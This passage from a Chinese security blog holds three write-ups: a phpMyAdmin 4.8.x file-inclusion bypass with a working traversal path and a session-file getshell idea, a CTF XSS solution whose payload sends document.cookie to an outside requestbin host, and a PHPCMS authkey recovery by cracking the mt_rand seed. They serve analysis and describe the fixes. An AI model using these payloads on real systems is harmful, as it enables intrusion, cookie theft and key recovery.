<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;$page, <span class="keyword">array</span> $whitelist = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;</span><br><span class="line">            $whitelist = <span class="built_in">self</span>::$goto_whitelist;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $page,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        ); <span class="comment">// $page 是我们传递进来的要包含的文件</span></span><br><span class="line">           <span class="comment">// 这里是截取到$page里?之前的文件名 并存入$_page中,</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果$_page, 在白名单之类的话, 直接通过, 所以这里我们不用双重编码也会return true.</span></span><br><span class="line">        <span class="comment">// public static $goto_whitelist = array(</span></span><br><span class="line">        <span class="comment">//      &#x27;db_datadict.php&#x27;,</span></span><br><span class="line">        <span class="comment">//      &#x27;db_sql.php&#x27;,</span></span><br><span class="line">        <span class="comment">//      &#x27;db_events.php&#x27;,</span></span><br><span class="line">        <span class="comment">//       随便从白名单的列表中选一个文件就行了。</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果双重编码, 在下面这个流程里因为解码了, 也会return true</span></span><br><span class="line">        $_page = urldecode($page);</span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>return true了, 就直接include了。</p>
<p>直接传 db_sql.php?/../robots.txt 就能成功包含到了。<br>不需要编码, 因为这时候 include ‘db_sql.php?/../robots.txt’<br>在include中, ?号后面的字符 并不会当成query,<br>问号也就只是路径的一部分而已。  所以不需要编码, 利用/../ 也能跳出目录。</p>
<p><img src="http://onw16foqc.bkt.clouddn.com/15309534675943.jpg"></p>
<hr>
<p>Getshell的话,  根据p师傅的思路,执行sql语句后, 直接包含session文件就行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$session_name &#x3D; &#39;phpMyAdmin&#39;;</span><br><span class="line">@session_name($session_name);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Restore correct sesion ID (it might have been reset by auto started session</span><br><span class="line">if (isset($_COOKIE[&#39;phpMyAdmin&#39;])) &#123;</span><br><span class="line">    session_id($_COOKIE[&#39;phpMyAdmin&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>phpmyadmin的session_name 是phpMyAdmin</p>
<p>执行的sql语句存入session的有两个位置。 一个就是sql_history。<br>/libraries/classes/Relation.php中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">&#x27;sql_history&#x27;</span>][] = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;db&#x27;</span> =&gt; $db,</span><br><span class="line">    <span class="string">&#x27;table&#x27;</span> =&gt; $table,</span><br><span class="line">    <span class="string">&#x27;sqlquery&#x27;</span> =&gt; $sqlquery,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>这里的$sqlquery 就是所执行的sql语句, 然后存入到了$_SESSION当中。</p>
<hr>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>4.8.2中, 修复了这个漏洞。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (! empty($_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; ! preg_match(&#39;&#x2F;^index&#x2F;&#39;, $_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;], [], true)</span><br><span class="line">) &#123;</span><br><span class="line">    include $_REQUEST[&#39;target&#39;];</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在调用checkPageValidity方法的时候, 第三个参数设置为了true</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public static function checkPageValidity(&amp;$page, array $whitelist &#x3D; [], $include &#x3D; false)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    if (empty($whitelist)) &#123;</span><br><span class="line">        $whitelist &#x3D; self::$goto_whitelist;</span><br><span class="line">    &#125;</span><br><span class="line">    if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (in_array($page, $whitelist)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($include) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $_page &#x3D; mb_substr(</span><br><span class="line">        $page,</span><br><span class="line">        0,</span><br><span class="line">        mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">    );</span><br><span class="line">    if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>当第三个参数为true的时候, 在mb_substr之前, 就return false了。<br>所以, 现在真的只能包含白名单内的文件了。</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/web/">web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/05/30/TCTF-h4x0rs-date/"><span>TCTF-h4x0rs.date</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/05/30/TCTF-h4x0rs-date/" rel="bookmark">
        <time class="entry-date published" datetime="2018-05-30T08:17:16.000Z">
          2018-05-30
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>TCTF的题, 看到了大佬的一种解法。 学习了一下这种解法的原理。<br><a target="_blank" rel="noopener" href="https://gist.github.com/tyage/8d8aead76ffc4924579783d72a63419f">https://gist.github.com/tyage/8d8aead76ffc4924579783d72a63419f</a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">&quot;//requestbin.fullcontact.com/15g8ko51?&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">/profile.php?id</span>=<span class="string">c7ab51c5bdeec6bc6068d8a643a29907a1b7c71acb455454381fe7320cd5283e</span> <span class="attr">id</span>=<span class="string">msg</span> <span class="attr">csp</span>=<span class="string">&quot;script-src &#x27;unsafe-inline&#x27;;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p>看了这个解法我才知道iframe还有个csp属性。。</p>
<p>把题目简化一下。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;https://h4x0rs.date/assets/csp.js?id=&amp;page=index.php&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">可控点aaaaa</span><br></pre></td></tr></table></figure>

<p>引入的js内容, 是用来创建csp的, script-src的nonce是在变化的。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meta = document.createElement(&#x27;meta&#x27;);</span><br><span class="line">meta.httpEquiv=&#x27;Content-Security-Policy&#x27;;</span><br><span class="line">meta.content=&quot;script-src &#x27;nonce-_indexphp_604b540b26cfe37756638953a26ff7f9&#x27;&quot;;</span><br><span class="line">document.head.appendChild(meta);</span><br></pre></td></tr></table></figure>

<p>看一下iframe的csp是干啥的</p>
<blockquote>
<p>iframe elements have a csp attribute, which specifies the policy that an embedded document must agree to enforce upon itself. For example, the following HTML would load <a target="_blank" rel="noopener" href="https://embedee.example.com/">https://embedee.example.com/</a>, and ensure that object-src ‘none’ was enforced upon it:</p>
</blockquote>
<p>也就是说, 如果iframe标签中定义了csp属性的话, 加载嵌入的页面的时候会按照这个csp的规则来加载。</p>
<p>那么如果使用iframe来加载当前页面的话, 再定义csp为unsafe-inline, </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;https://h4x0rs.date/assets/csp.js?id=&amp;page=index.php&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样原本页面中引入csp.js的时候就会因为csp的原因被chrome给拦截掉,<br>即创建script-src 的nonce就失败了，则嵌入的页面当前csp依旧为unsafe-inline。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>就可以执行了。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;https://h4x0rs.date/assets/csp.js?id=&amp;page=index.php&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">1.html</span> <span class="attr">csp</span>=<span class="string">&quot;script-src &#x27;unsafe-inline&#x27;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="http://onw16foqc.bkt.clouddn.com/15276662706306.jpg"></p>
<hr>
<p>如果js创建csp不是引入的外部js, 而就是在脚本内的话。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    meta = <span class="built_in">document</span>.createElement(<span class="string">&#x27;meta&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    meta.httpEquiv=<span class="string">&#x27;Content-Security-Policy&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    meta.content=<span class="string">&quot;script-src &#x27;nonce-_indexphp_604b540b26cfe37756638953a26ff7f9&#x27;&quot;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.head.appendChild(meta);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:,alert(document.domain)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">1.html</span> <span class="attr">csp</span>=<span class="string">&quot;script-src data:&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>把csp改成script-src ,自己的域名, 或者data协议之类的即可。</p>
<p><img src="http://onw16foqc.bkt.clouddn.com/15276665012208.jpg"></p>
<hr>
<p>现在的浏览器应该暂时只有chrome支持iframe的csp属性。<br>大部分创建csp还是会在response header中来创建滴。</p>
<hr>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a><strong>Reference</strong></h2><ol>
<li><a target="_blank" rel="noopener" href="https://gist.github.com/tyage/8d8aead76ffc4924579783d72a63419f">https://gist.github.com/tyage/8d8aead76ffc4924579783d72a63419f</a></li>
<li><a target="_blank" rel="noopener" href="https://w3c.github.io/webappsec-csp/embedded/">https://w3c.github.io/webappsec-csp/embedded/</a></li>
</ol>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2017/05/13/PHPCMS-MT-RAND-SEED-CRACK致authkey泄露。/"><span>PHPCMS MT_RAND SEED CRACK致authkey泄露。</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2017/05/13/PHPCMS-MT-RAND-SEED-CRACK致authkey泄露。/" rel="bookmark">
        <time class="entry-date published" datetime="2017-05-13T06:30:12.000Z">
          2017-05-13
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>看到phpcms更新了, 看了下补丁, 分析了下他修复的漏洞。</p>
<p>这种漏洞在CTF中还是比较常见的, 实例我还是第一次遇到。</p>
<hr>
<p>在INSTALL.PHP中</p>
<p><img src="http://onw16foqc.bkt.clouddn.com/14945986677331.jpg"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    $cookie_pre = random(<span class="number">5</span>, <span class="string">&#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>).<span class="string">&#x27;_&#x27;</span>;$auth_key = random(<span class="number">20</span>, <span class="string">&#x27;1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);		</span><br></pre></td></tr></table></figure>
<p>在安装的时候, 用random来生成了cookie_pre 和 authkey,</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">$length, $chars = <span class="string">&#x27;0123456789&#x27;</span></span>) </span>&#123;</span><br><span class="line">	$hash = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	$max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">		$hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里使用了mt_rand来生成chars的索引来生成authkey之类的。<br>mt_rand 在一个脚本中, 产生多个随机数的时候, 只播了一次种。<br>那么也就是mt_rand生成cookie_pre和authkey的种子是一样的。<br>cookie_pre从名字就能看出这个是cookie名称的前缀, 所以是可以拿到的, 那么只要用cookie_pre爆破到了种子的话, 那么也就是拿到了生成authkey的种子。<br>因为种子确定了的话, 产生的随机数序列就可以确定了, 也就是每次的索引可以确定了, 就可以拿到auth_key了。</p>
<p><img src="http://onw16foqc.bkt.clouddn.com/14946511358285.jpg"></p>
<p>首先看到 COOKIE_PRE  为 AZZBP</p>
<p>这里直接用下wonderkun大佬的脚本, 来获取一下cookie_pre的各个字符串在序列中的位置。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">$str = <span class="string">&quot;AZZBP&quot;</span>;</span><br><span class="line">$randStr = <span class="string">&quot;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">   $pos = strpos($randStr,$str[$i]);</span><br><span class="line">   <span class="keyword">echo</span> $pos.<span class="string">&quot; &quot;</span>.$pos.<span class="string">&quot; &quot;</span>.<span class="string">&quot;0 &quot;</span>.(strlen($randStr)<span class="number">-1</span>).<span class="string">&quot; &quot;</span>;</span><br><span class="line">   <span class="comment">//整理成方便 php_mt_seed 测试的格式</span></span><br><span class="line">  <span class="comment">//php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>26 26 0 51 51 51 0 51 51 51 0 51 27 27 0 51 41 41 0 51</p>
<p>然后用<a target="_blank" rel="noopener" href="http://www.openwall.com/php_mt_seed/">MT_RAND SEED CRACKER</a>来爆破一下种子。</p>
<p>然后把爆破到的种子, 用mt_srand设置一下种子, 再来获得随机数列, 就能拿到authkey了。<br>因为爆破到的种子会有多个。 就一个一个慢慢试了。</p>
<p><img src="http://onw16foqc.bkt.clouddn.com/14946523923708.jpg"></p>
<p><img src="http://onw16foqc.bkt.clouddn.com/14946524083388.jpg"></p>
<p><img src="http://onw16foqc.bkt.clouddn.com/14946524181285.jpg"></p>
<p>在试第三个种子的时候就拿到了正确的auth_key了。</p>
<p><img src="http://onw16foqc.bkt.clouddn.com/14946524562454.jpg"></p>
<p>拿到auth_key后 可以做的事情很多, 就不多说了。</p>
<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>官方的已经修复了。<br><img src="http://onw16foqc.bkt.clouddn.com/14946526464301.jpg"></p>
<p>多次播种了, 那么根据cookie_pre拿到的种子和生成auth_key的种子是不一样的, 所以authkey生成的序列就不知道咯。</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>




<nav class="pagination">
  
  <a href="/page/2/" class="pagination-prev">Prev</a>
  
  
  <a href="/page/4/" class="pagination-next">Next</a>
  
</nav>
    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2021 雨了个雨
    
  </p>
</footer>
    
    
  </div>
</div>
</body>
</html>